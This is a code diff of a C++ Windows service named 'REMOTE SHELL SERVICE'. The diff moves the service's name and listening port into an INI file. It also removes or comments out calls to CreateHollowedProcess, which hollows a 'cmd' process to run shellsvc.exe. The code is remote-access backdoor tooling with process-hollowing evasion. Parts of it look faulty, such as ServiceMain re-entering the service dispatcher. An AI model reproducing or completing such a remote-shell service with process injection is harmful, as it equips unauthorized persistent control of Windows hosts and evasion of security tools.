@@ -14,7 +14,8 @@
 #include "cmdline.h"
 #include "netclient.h"
 #include "windows-api-ex.h"
-
+#include "INIReader.h"
+#include "helpers.h"
 void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile);
 
 using namespace std;
@@ -31,17 +32,18 @@ void  ControlHandler(DWORD request);
 int   InitService();
 void  ServiceReportEvent(WORD  LogType, const TCHAR* ProcessName, TCHAR* Message);
 int   _MainFunction(int argc, char* argv[]);
+int   _DummyFunction(int argc, char* argv[]);
 long  Continue();
 long  Pause();
 long  Stop();
 
 extern unsigned int gNetClientIndex;
-void StartInBackground()
+void StartInBackground(char *service_name)
 {
     LOG_INFO("SvcMain::StartInBackground", "StartInBackground");
 
-    SERVICE_TABLE_ENTRY ServiceTable[2];
-    ServiceTable[0].lpServiceName = SVC_NAME;
+   SERVICE_TABLE_ENTRY ServiceTable[2];
+    ServiceTable[0].lpServiceName = service_name;
     ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
 
     ServiceTable[1].lpServiceName = NULL;
@@ -49,14 +51,21 @@ void StartInBackground()
     // Start the control dispatcher thread for our service
 
     if (!StartServiceCtrlDispatcher(ServiceTable)) {
-        LOG_ERROR("SvcMain::StartInBackground", "StartServiceCtrlDispatcher failed %ls (%d)", SVC_NAME, GetLastError());
-        ServiceReportEvent(0, SVC_NAME, TEXT("StartServiceCtrlDispatcher failed"));
+        LOG_ERROR("SvcMain::StartInBackground", "StartServiceCtrlDispatcher failed %s (%d)", service_name, GetLastError());
+        ServiceReportEvent(0, service_name, TEXT("StartServiceCtrlDispatcher failed"));
         //ErrorMessage("StartServiceCtrlDispatcher");
         return;
     }
     return;
 
 }
+
+int gSERVICE_PORT = 22045;
+bool gSERVER_ACTIVE = true;
+
+std::string g_CONFIG_SERVICE_PATH;
+std::string g_CONFIG_SERVICE_NAME;
+
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
@@ -81,39 +90,39 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     bool optIntall = inputParser->isSet(cmdlineOptionInstall);
     bool optUninstall = inputParser->isSet(cmdlineOptionUninstall);
 
+    const char* iniPath = get_ini_path();
+    
+    INIReader reader(iniPath);
+
+    if (reader.ParseError() < 0) {
+        LOG_ERROR("ServiceMain", "Can't load 'service.ini'");
+        cout << "ERROR: Can't load 'service.ini'";
+        return 1;
+    }
+
+    gSERVICE_PORT = reader.GetInteger("network", "port", -1);
+    g_CONFIG_SERVICE_NAME = reader.Get("service", "name", "UNKNOWN");
+    g_CONFIG_SERVICE_PATH = reader.Get("service", "path", "UNKNOWN");
+    gSERVER_ACTIVE = reader.GetBoolean("service", "active", false);
+    LOG_TRACE("ServiceMain", "Config loaded from 'service.ini': port=%d . path: %s . name %s . Status %s", gSERVICE_PORT, g_CONFIG_SERVICE_PATH.c_str(), g_CONFIG_SERVICE_NAME.c_str(), gSERVER_ACTIVE ? "Active" : "Inactive");
+
+    
+    bool bDebugMode = reader.GetBoolean("service", "debug", false);
+
     COUTR("================================================");
     COUTY("REMOTE SHELL SERVICE");
     COUTR("================================================");
 
-    if (optDebug) {
-        COUTY("START IN TEST MODE: FOREGROUND");
+    if (optDebug || bDebugMode) {
+        COUTY("START IN DEBUG MODE: FOREGROUND");
 
-        //LPWSTR lpExePath = C::Path::GetExecutablePath();
-        //char* seExe = C::Convert::StringToString(lpExePath);
-  
-        char* pPath = new char[MAX_PATH];
-        GetModuleFileNameA(0, pPath, MAX_PATH);
-        pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
-        strcat(pPath, "shellsvc.exe");
-        COUTY("Starting Service %s", pPath);
-        LOG_TRACE("SvcMain", "Starting Service %s", pPath);
-
-        CreateHollowedProcess
-        (
-            "cmd",
-            pPath
-        );
-
-
-        /*if (!SetConsoleCtrlHandler((PHANDLER_ROUTINE)ConsoleCtrlHandler, TRUE)) {
+        if (!SetConsoleCtrlHandler((PHANDLER_ROUTINE)ConsoleCtrlHandler, TRUE)) {
             return RetVal;
         }
 
-        RetVal = _MainFunction(argc, argv);
-        */
+        RetVal = _MainFunction(__argc, __argv);
         
         return RetVal;
-
     }
     else if (optIntall) {
         COUTY("INSTALL SERVICE");
@@ -123,7 +132,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         COUTY("UNINSTALL SERVICE");
         return RET_SUCCESS;
     }
-    StartInBackground();
+    char service_name[MAX_PATH];
+    strncpy(service_name, g_CONFIG_SERVICE_NAME.c_str(), MAX_PATH - 1);
+    StartInBackground(service_name);
    
     return RET_SUCCESS;
 }
@@ -132,7 +143,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
 void ServiceMain(int argc, char** argv)
 {
-
+    LOG_TRACE("ServiceMain", "ServiceMain");
     // ensure only one running instance
     HANDLE hMutexHandle = CreateMutex(NULL, TRUE, "my.mutex.name");
     if (GetLastError() == ERROR_ALREADY_EXISTS)
@@ -148,8 +159,10 @@ void ServiceMain(int argc, char** argv)
         ServiceStatus.dwServiceSpecificExitCode = 0;
         ServiceStatus.dwCheckPoint = 0;
         ServiceStatus.dwWaitHint = 0;
-
-        hStatus = RegisterServiceCtrlHandler(SVC_NAME, (LPHANDLER_FUNCTION)ControlHandler);
+        char service_name[MAX_PATH];
+        strncpy(service_name, g_CONFIG_SERVICE_NAME.c_str(), MAX_PATH - 1);
+        StartInBackground(service_name);
+        hStatus = RegisterServiceCtrlHandler(service_name, (LPHANDLER_FUNCTION)ControlHandler);
 
         if (hStatus == (SERVICE_STATUS_HANDLE)0)
         {
@@ -183,6 +196,14 @@ void ServiceMain(int argc, char** argv)
         return;
     }
 
+    LOG_ERROR("ServiceMain", "GetLastError (%d)", GetLastError());
+
+
+
+
+    /*
+    
+    
     char* pPath = new char[MAX_PATH];
     GetModuleFileNameA(0, pPath, MAX_PATH);
     pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
@@ -197,6 +218,7 @@ void ServiceMain(int argc, char** argv)
     );
 
     Sleep(2000);
+    */
 }
 
 // Service initialization
@@ -246,6 +268,22 @@ void ControlHandler(DWORD request)
 #define ISVALIDSOCKET(s) ((s) >= 0)
 #endif
 
+int _DummyFunction(int argc, char** argv)
+{
+    LOG_TRACE("_DummyFunction", "4");
+    bool running = true;
+    while (running) {
+
+        Sleep(1000);
+        _NETPRINTF("Running service...");
+
+    }
+
+    return 0;
+}
+
+
+
 int _MainFunction(int argc, char** argv)
 {
 #ifdef UNICODE
@@ -274,6 +312,22 @@ int _MainFunction(int argc, char** argv)
         client_socket[i] = 0;
     }
 
+
+    const char* iniPath = get_ini_path();
+
+    INIReader reader(iniPath);
+    unsigned int port = 35001;
+    if (reader.ParseError() >= 0) {
+        
+        port = reader.GetInteger("network", "port", -1);
+        _NETPRINTF("reading port : %d", port);
+    }
+    else {
+        _NETPRINTF("Can't load 'service.ini'");
+    }
+
+    
+
     _NETPRINTF("Initialising Winsock...");
     if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
     {
@@ -293,7 +347,7 @@ int _MainFunction(int argc, char** argv)
     }
 
     _NETPRINTF("Socket created.\n");
-    unsigned int port = 27020;
+    
     //Prepare the sockaddr_in structure
     server.sin_family = AF_INET;
     server.sin_addr.s_addr = INADDR_ANY;
